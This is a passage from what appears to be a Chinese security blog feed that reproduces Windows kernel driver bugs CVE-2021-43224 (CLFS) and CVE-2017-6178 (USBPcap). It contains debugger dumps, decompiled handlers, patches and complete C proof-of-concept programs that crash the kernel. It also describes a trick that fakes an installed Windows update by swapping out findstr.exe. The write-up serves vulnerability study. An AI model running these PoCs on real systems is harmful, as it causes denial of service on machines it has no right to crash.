class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000002</span>fffff986`f<span class="hljs-number">0d95630</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> fffff807`<span class="hljs-number">0575907</span>cfffff986`f<span class="hljs-number">0d95640</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000010</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00040301</span>fffff986`f<span class="hljs-number">0d95650</span>  fffff986`f<span class="hljs-number">0d95660</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000018</span>fffff986`f<span class="hljs-number">0d95660</span>  ffff8687`<span class="hljs-number">047d1c01</span> ffff86<span class="hljs-number">87`06b70c70</span>   &lt;= ffff8687`<span class="hljs-number">047d1c01</span> canaryfffff986`f<span class="hljs-number">0d95670</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d95680</span>  ffff86<span class="hljs-number">87`02f39a80</span> ffff86<span class="hljs-number">87`06b70b00</span>fffff986`f<span class="hljs-number">0d95690</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> fffff807`<span class="hljs-number">057817</span>fd   &lt;= fffff807`<span class="hljs-number">057817</span>fd ret addrfffff986`f<span class="hljs-number">0d956a0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000002</span> ffff86<span class="hljs-number">87`06b70b00</span>fffff986`f<span class="hljs-number">0d956b0</span>  ffff86<span class="hljs-number">87`02f39a80</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d956c0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000004</span> ffff8687`<span class="hljs-number">02</span>ca08c0fffff986`f<span class="hljs-number">0d956d0</span>  fffff986`f<span class="hljs-number">0d95738</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000160</span>fffff986`f<span class="hljs-number">0d956e0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> ffff8687`<span class="hljs-number">02</span>ca08c8</code></pre><p>调用<code>CClfsLogFcbPhysical::QueryLogFileInfo</code>之后的<code>CClfsLogFcbVirtual::QueryLogFileInfo</code>的栈帧如下，其<code>canary</code>和<code>ret addr</code>都被覆盖了</p><pre><code class="hljs apache"><span class="hljs-attribute">after</span> call CClfsLogFcbPhysical::QueryLogFileInfo<span class="hljs-attribute">1</span>: kd&gt; dq fffff<span class="hljs-number">986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">955</span>d<span class="hljs-number">0</span> fffff<span class="hljs-number">986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">955</span>d<span class="hljs-number">0</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">955</span>d<span class="hljs-number">0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">955</span>e<span class="hljs-number">0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00010000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">955</span>f<span class="hljs-number">0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95600</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000002</span> <span class="hljs-number">00000200</span>`<span class="hljs-number">00009</span>c<span class="hljs-number">40</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95610</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95620</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95630</span>  ffffffff`<span class="hljs-number">00000000</span> <span class="hljs-number">11</span>ed<span class="hljs-number">2</span>ea<span class="hljs-number">7</span>`<span class="hljs-number">221</span>ace<span class="hljs-number">71</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95640</span>  a<span class="hljs-number">32</span>f<span class="hljs-number">0</span>e<span class="hljs-number">59</span>`<span class="hljs-number">6</span>c<span class="hljs-number">04</span>c<span class="hljs-number">9</span>a<span class="hljs-number">3</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95650</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95660</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95670</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95680</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95690</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">956</span>a<span class="hljs-number">0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">956</span>b<span class="hljs-number">0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">956</span>c<span class="hljs-number">0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">956</span>d<span class="hljs-number">0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">956</span>e<span class="hljs-number">0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> ffff<span class="hljs-number">8687</span>`<span class="hljs-number">02</span>ca<span class="hljs-number">08</span>c<span class="hljs-number">8</span></code></pre><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>我直接用的这个<a href="https://github.com/KaLendsi/CVE-2021-43224-POC">POC</a>，所以上述调试的时候，<code>0x110</code>就是来自于此，刚好可以覆盖到返回值</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;wchar.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;clfsw32.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Clfsmgmtw32.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;clfsw32.lib&quot;</span>)</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-keyword">wchar_t</span> szLogPath[] = <span class="hljs-string">L&quot;LOG:C:\\Users\\Public\\MyLog::Stream1&quot;</span>;<span class="hljs-comment">//wchar_t szLogPath[] = L&quot;??\\LOG:\\HarddiskVolume0\\MyLog&quot;;</span><span class="hljs-comment">//wchar_t szLogPath[] = L&quot;LOG:\\\\?\\GLOBALROOT\\Device\\HarddiskVolume0\\Users\\Public\\MysssLog&quot;;</span><span class="hljs-comment">//\\\\?\\GLOBALROOT\\Device\\HarddiskVolume0</span><span class="hljs-comment">//SECURITY_ATTRIBUTES psaLogFile = &#123;&#125;;</span>HANDLE   hLog = CreateLogFile(szLogPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, OPEN_ALWAYS, <span class="hljs-literal">NULL</span>);<span class="hljs-keyword">if</span> (INVALID_HANDLE_VALUE == hLog)&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error=%d\n&quot;</span>, GetLastError());<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">if</span> (!RegisterManageableLogClient(hLog, <span class="hljs-number">0</span>))<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error=%d\n&quot;</span>, GetLastError());<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hLog=%p\n&quot;</span>, hLog);CLFS_INFORMATION pinfoBuffer = &#123;&#125;;<span class="hljs-comment">//ULONG infoSize = sizeof(pinfoBuffer);</span>ULONG infoSize = <span class="hljs-number">0x110</span>;system(<span class="hljs-string">&quot;pause&quot;</span>);DWORD dwRet = GetLogFileInformation(hLog, &amp;pinfoBuffer, &amp;infoSize);<span class="hljs-keyword">if</span> (dwRet == <span class="hljs-literal">NULL</span>)&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error=%d\n&quot;</span>, GetLastError());<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dwRet=%08x\n&quot;</span>, dwRet);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>我分析<code>patch</code>的时候，是直接用的<code>2021.09.18</code>、<code>2021.11.16</code>的<code>clfs.sys</code>，可能因为是<code>win8.1</code>的，所以没<code>pdb</code>，直接防止输入的大小大于<code>0x78</code></p><p><img src="/img/CVE-2021-43224/patch.png" alt="patch"></p><h2 id="该POC的整个流程"><a href="#该POC的整个流程" class="headerlink" title="该POC的整个流程"></a>该POC的整个流程</h2><p>后续，看了一下，用户态的接口是如何和内核态的驱动调用联系上的</p><pre><code class="hljs erlang-repl">clfsw32!CreateLogFile -&gt; ntdll!NtCreateFileclfsw32!RegisterManageableLogClient -&gt; KERNELBASE!DeviceIoControl -&gt; ntdll!NtDeviceIoControlFileclfsw32!GetLogFileInformation -&gt; KERNELBASE!DeviceIoControl -&gt; ntdll!NtDeviceIoControlFile</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整个漏洞不是很复杂，漏洞的危害也只能达到<code>BSOD</code>，不确定间接跳转是否能跳转到其他的地方，还需要继续分析</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://github.com/KaLendsi/CVE-2021-43224-POC">https://github.com/KaLendsi/CVE-2021-43224-POC</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2017-6178 漏洞复现</title>
    <link href="/2022/07/26/CVE-2017-6178%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/07/26/CVE-2017-6178%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>复现<code>CVE-2017-6178</code>时，还是踩了很多坑的</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code class="hljs nsis">虚拟机：<span class="hljs-literal">Win7</span> SP1 x86物理机：<span class="hljs-literal">Win10</span>debugger：windbg previewcompiler：vs2022</code></pre><p>主要为了获取<code>x86</code>的<code>USBPcap.sys</code>花费了很多时间，首先根据<code>CVE-2017-6178</code>的漏洞描述以及<code>exploit-db</code>的说明，可知其实可以通过安装<a href="https://2.na.dl.wireshark.org/win32/all-versions/Wireshark-win32-2.2.5.exe">Wireshark-win32-2.2.5.exe</a>得到<code>USBPcap.sys</code></p><p>但是我最初的时候，通过<code>Win7 SP x64</code>安装，但是这样得到的是<code>x64</code>的<code>USBPcap.sys</code>（我不确定是否存在洞，最后分析完了之后看<code>x64</code>版本是有的，其实<code>github</code>上<code>1.0.0.7</code>里面也有洞，可是当时我没翻到这个文件🙃），于是我把<code>x64</code>上得到的<code>USBPcapSetup-1.1.0.0-g794bf26-5.exe</code>放到<code>win7 x86</code>上进行安装，最后得到了<code>x86</code>的<code>USBPcap.sys</code>（直接拿32位的<code>wireshark-2.2.5.exe</code>安装也应该可以）</p><p>这个时候就报出，需要将<code>win7</code>更新到安装了<code>KB3033929</code>的版本，但是我已经安装了，最后在<code>USBPcap</code>的<code>github</code>仓库的<a href="https://github.com/desowin/usbpcap/issues/31">issue</a>，找到了一个伪装自己已经安装了<code>KB3033929</code>的方法</p><p>通过创建一个内容为<code>@echo KB3033929</code>的<code>findstr.cmd</code>文件，放入<code>c:\windows\system32</code>目录，并将其目录下的<code>findstr.exe</code>修改名字，从而实现查询时，返回已安装的结果</p><p>注：这个地方，需要重命名<code>findstr.exe</code>的时候需要修改<code>findstr.exe</code>文件的<code>own</code>和赋予<code>admin</code>权限，参考<a href="https://blog.csdn.net/zy_strive_2012/article/details/79470829">这篇博客</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这个漏洞其实比较简单，就是在设置<code>dispatchHandler</code>时，对于<code>IRP_MJ_FILE_SYSTEM_CONTROL 0x0d</code>，这个<code>handler</code>中处理出错（注：<code>sub_1145A</code>即<code>IRP_MJ_FILE_SYSTEM_CONTROL</code>的<code>handler</code>）</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall <span class="hljs-title">sub_1145A</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, PVOID Tag)</span></span><span class="hljs-function"></span>&#123;  _DEVICE_OBJECT *v2; <span class="hljs-comment">// edi</span>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span>  _DEVICE_OBJECT *DriverObject; <span class="hljs-comment">// ecx</span>  NTSTATUS v6; <span class="hljs-comment">// edi</span>  _DEVICE_OBJECT **p_AttachedDevice; <span class="hljs-comment">// [esp-Ch] [ebp-18h]</span>  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [esp+14h] [ebp+8h]</span>  v2 = *(_DEVICE_OBJECT **)(a1 + <span class="hljs-number">40</span>);  v3 = IoAcquireRemoveLockEx((PIO_REMOVE_LOCK)&amp;v2-&gt;AttachedDevice, Tag, &amp;File, <span class="hljs-number">1u</span>, <span class="hljs-number">0x18</span>u);  v8 = v3;  <span class="hljs-keyword">if</span> ( v3 &gt;= <span class="hljs-number">0</span> )  &#123;    DriverObject = (_DEVICE_OBJECT *)v2-&gt;DriverObject;    ++*((_BYTE *)Tag + <span class="hljs-number">35</span>);    *((_DWORD *)Tag + <span class="hljs-number">24</span>) += <span class="hljs-number">36</span>;    p_AttachedDevice = &amp;v2-&gt;AttachedDevice;    v6 = IofCallDriver(DriverObject, (PIRP)Tag);<span class="hljs-comment">// vuln</span>    IoReleaseRemoveLockEx((PIO_REMOVE_LOCK)p_AttachedDevice, Tag, <span class="hljs-number">0x18</span>u);    <span class="hljs-keyword">return</span> v6;  &#125;  <span class="hljs-keyword">else</span>  &#123;    sub_11434((PIRP)Tag, v3, <span class="hljs-number">0</span>);    <span class="hljs-keyword">return</span> v8;  &#125;&#125;</code></pre><p>这个地方并未判断<code>DriverObject</code>是否为<code>NULL</code>，而导致这个未初始化的值直接传入了<code>IofCallDriver</code>，从而出现了空指针解引用的错误</p><p>最终<code>crash</code>位置</p><pre><code class="hljs routeros">Access violation - code c0000005 (!!! second chance !!!)<span class="hljs-attribute">eax</span>=87b91268 <span class="hljs-attribute">ebx</span>=86ff89f0 <span class="hljs-attribute">ecx</span>=0000000d <span class="hljs-attribute">edx</span>=87b911f8 <span class="hljs-attribute">esi</span>=00000000 <span class="hljs-attribute">edi</span>=86ff89e0<span class="hljs-attribute">eip</span>=83e57f7b <span class="hljs-attribute">esp</span>=8a987ac0 <span class="hljs-attribute">ebp</span>=8a987ac8 <span class="hljs-attribute">iopl</span>=0         nv up ei ng nz na po cy<span class="hljs-attribute">cs</span>=0008  <span class="hljs-attribute">ss</span>=0010  <span class="hljs-attribute">ds</span>=0023  <span class="hljs-attribute">es</span>=0023  <span class="hljs-attribute">fs</span>=0030  <span class="hljs-attribute">gs</span>=0000             <span class="hljs-attribute">efl</span>=00010383nt!IofCallDriver+0x57:83e57f7b 8b4608          mov     eax,dword ptr [esi+8] ds:0023:<span class="hljs-attribute">00000008</span>=????????</code></pre><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>因为是<code>IRP_MJ_FILE_SYSTEM_CONTROL</code>，所以要用<code>FILE_DEVICE_FILE_SYSTEM</code>的<code>IOCTL</code>才可以</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_DEVICE_FILE_SYSTEM         0x00000009</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_DEVICE_UNKNOWN             0x00000022</span></code></pre><p>最终<code>POC</code>是直接用的<a href="https://github.com/k0keoyo/try_exploit/blob/master/_cve_2017_6178_poc/_CVE_2017_6178_PoC.cpp"> k0keoyo师傅的POC </a></p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>&#123;    HANDLE hDevice;    DWORD dwRetBytes = <span class="hljs-number">0</span>;    hDevice = CreateFile(<span class="hljs-string">&quot;\\\\.\\USBPcap1&quot;</span>, <span class="hljs-number">0</span>, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] CreateFile failed (%.08x)\n&quot;</span>, GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    bResult = DeviceIoControl(hDevice, <span class="hljs-number">0x00090000</span>,(LPVOID)<span class="hljs-number">0x1</span>, (DWORD)<span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;dwRetBytes, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (!bResult)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] DeviceIOControl failed (%.08x)\n&quot;</span>,GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] if show this info ,PoC is failed:(\n\n&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>修复这个漏洞也很简单，就是判断一下这个<code>DriverObject</code>是不是初始化的<code>NULL</code></p><pre><code class="hljs c"><span class="hljs-function">NTSTATUS __stdcall <span class="hljs-title">sub_402038</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, PVOID Tag)</span></span><span class="hljs-function"></span>&#123;  _DEVICE_OBJECT *v2; <span class="hljs-comment">// ebx</span>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span>  NTSTATUS v4; <span class="hljs-comment">// edi</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">DEVICE_OBJECT</span> *<span class="hljs-title">DriverObject</span>;</span> <span class="hljs-comment">// ecx</span>  v2 = *(_DEVICE_OBJECT **)(a1 + <span class="hljs-number">40</span>);  v3 = IoAcquireRemoveLockEx((PIO_REMOVE_LOCK)&amp;v2-&gt;AttachedDevice, Tag, &amp;File, <span class="hljs-number">1u</span>, <span class="hljs-number">0x18</span>u);  v4 = v3;  <span class="hljs-keyword">if</span> ( v3 &gt;= <span class="hljs-number">0</span> )  &#123;    DriverObject = (struct _DEVICE_OBJECT *)v2-&gt;DriverObject;    <span class="hljs-keyword">if</span> ( DriverObject )    &#123;      ++*((_BYTE *)Tag + <span class="hljs-number">35</span>);      *((_DWORD *)Tag + <span class="hljs-number">24</span>) += <span class="hljs-number">36</span>;      v4 = IofCallDriver(DriverObject, (PIRP)Tag);    &#125;    <span class="hljs-keyword">else</span>    &#123;      v4 = <span class="hljs-number">-1073741808</span>;      sub_40201A((PIRP)Tag, <span class="hljs-number">-1073741808</span>, <span class="hljs-number">0</span>);    &#125;    IoReleaseRemoveLockEx((PIO_REMOVE_LOCK)&amp;v2-&gt;AttachedDevice, Tag, <span class="hljs-number">0x18</span>u);  &#125;  <span class="hljs-keyword">else</span>  &#123;    sub_40201A((PIRP)Tag, v3, <span class="hljs-number">0</span>);  &#125;  <span class="hljs-keyword">return</span> v4;&#125;</code></pre><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>调试这边踩坑特别多，最初对<code>DeviceIoControl</code>的流程不理解的时候，下断点的时候，一直参照其他的调试驱动出错时的<code>nt!NtDeviceIoControlFile</code>函数中下断点</p><p>最初是以为是，自己的条件断点不熟练，以及<code>offset=0</code>时，这个<code>ebp</code>还不是后续的<code>ebp</code>所以出错</p><pre><code class="hljs x86asm">nt!NtDeviceIoControlFile:840a07a9 8bff            <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>,<span class="hljs-built_in">edi</span>840a07ab <span class="hljs-number">55</span>              <span class="hljs-keyword">push</span>    <span class="hljs-built_in">ebp</span>840a07ac 8bec            <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebp</span>,<span class="hljs-built_in">esp</span>840a07ae 6a01            <span class="hljs-keyword">push</span>    <span class="hljs-number">1</span>840a07b0 ff752c          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">2Ch</span>]840a07b3 ff7528          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">28h</span>]840a07b6 ff7524          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">24h</span>]840a07b9 ff7520          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">20h</span>]840a07bc ff751c          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">1Ch</span>]840a07bf ff7518          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">18h</span>]840a07c2 ff7514          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">14h</span>]840a07c5 ff7510          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">10h</span>]840a07c8 ff750c          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">0Ch</span>]840a07cb ff7508          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">8</span>]840a07ce e8a682fbff      <span class="hljs-keyword">call</span>    nt!IopXxxControlFile (84058a79)840a07d3 <span class="hljs-number">5d</span>              <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">ebp</span>840a07d4 c22800          <span class="hljs-keyword">ret</span>     <span class="hljs-number">28h</span></code></pre><p>后来才发现是因为，这个<code>DeviceIoControl</code>因为是<code>#define FILE_DEVICE_FILE_SYSTEM         0x00000009</code>，所以走的是另外一条路，应该是在<code>nt!NtFsControlFile</code>中下断点</p><p>最终条件断点的指令为</p><pre><code class="hljs apache"><span class="hljs-attribute">bp</span> nt!NtFsControlFile+<span class="hljs-number">0</span>x<span class="hljs-number">25</span> <span class="hljs-string">&quot;.printf\&quot;IOCTL:%p\&quot;,dwo(esp+0x14);.echo;g&quot;</span><span class="hljs-attribute">bp</span> nt!NtFsControlFile+<span class="hljs-number">0</span>x<span class="hljs-number">25</span> <span class="hljs-string">&quot;.if(dwo(esp+0x14)=0x00090000)&#123;&#125;.else&#123;gc;&#125;&quot;</span><span class="hljs-attribute">bp</span> nt!IofCallDriver+<span class="hljs-number">60</span> <span class="hljs-string">&quot;.if(ecx=0xd)&#123;&#125;.else&#123;gc;&#125;&quot;</span></code></pre><p>这个地方也可以用<code>poi</code>，关于<a href="https://stackoverflow.com/questions/37991872/how-to-reference-32bit-integer-data-in-a-64-bit-dump">dwo qwo poi的区别</a>，<a href="https://stackoverflow.com/questions/6097157/conditional-breakpoint-that-tests-multiple-stack-variables">多个条件的断点</a>，<a href="https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2020/07/27/debugging_malwarewi-hk5u.html">echo</a></p><h2 id="该POC的整个流程"><a href="#该POC的整个流程" class="headerlink" title="该POC的整个流程"></a>该POC的整个流程</h2><p>为了调试弄清<code>DeviceIoControl</code>从用户态如何到了驱动的<code>dispatch Handler</code>，我在如下地方下了断点</p><pre><code class="hljs armasm"><span class="hljs-keyword">bp</span> kernel32!DeviceIoControl<span class="hljs-keyword">bp</span> kernel32!DeviceIoControlImplementation<span class="hljs-keyword">bp</span> kernelbase!DeviceIoControl</code></pre><p>发现首先会断在<code>kernel32!DeviceIoControlImplementation</code>，再是<code>kernel32!DeviceIoControl</code>，最后是<code>kernelbase!DeviceIoControl</code></p><p>因此该流程应该如下</p><p>用户态的<code>DeviceIoControl</code> </p><p>=&gt; 内核的<code>ntoskrnl.exe</code>的<code>ZwDeviceIoControl</code>函数（通过<code>call KiSystemService</code>） </p><pre><code class="hljs c"><span class="hljs-function">NTSTATUS __stdcall <span class="hljs-title">ZwDeviceIoControlFile</span><span class="hljs-params">(...)</span></span><span class="hljs-function"></span>&#123;  __readeflags();  <span class="hljs-keyword">return</span> KiSystemService(<span class="hljs-number">8</span>);&#125;</code></pre><p>=&gt; 内核<code>kernel32.dll</code>的<code>DeviceIoControlImplementation</code>（通过<code>call DeviceIoControl</code>）</p><pre><code class="hljs c"><span class="hljs-function">BOOL __stdcall <span class="hljs-title">DeviceIoControlImplementation</span><span class="hljs-params">(...)</span></span><span class="hljs-function"></span>&#123;  DWORD v8; <span class="hljs-comment">// esi</span>  NTSTATUS v10; <span class="hljs-comment">// eax</span>  v8 = dwIoControlCode;  <span class="hljs-keyword">if</span> ( dwIoControlCode != <span class="hljs-number">0x2D4808</span> &amp;&amp; dwIoControlCode != <span class="hljs-number">0x74808</span> &amp;&amp; dwIoControlCode != <span class="hljs-number">0x90020</span>    || NtCurrentTeb()-&gt;ProcessEnvironmentBlock-&gt;SessionId == MEMORY[<span class="hljs-number">0x7FFE02D8</span>] )  &#123;    <span class="hljs-keyword">return</span> DeviceIoControl(...);  &#125;  v10 = IsTSAppCompatEnabled((BOOL *)&amp;dwIoControlCode);  <span class="hljs-keyword">if</span> ( v10 &gt;= <span class="hljs-number">0</span> )  &#123;    <span class="hljs-keyword">if</span> ( dwIoControlCode &amp;&amp; !IsCallerAdminOrSystem() )    &#123;      BaseSetLastNTError(<span class="hljs-number">-1073741790</span>);      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    <span class="hljs-keyword">return</span> DeviceIoControl(...);  &#125;  BaseSetLastNTError(v10);  <span 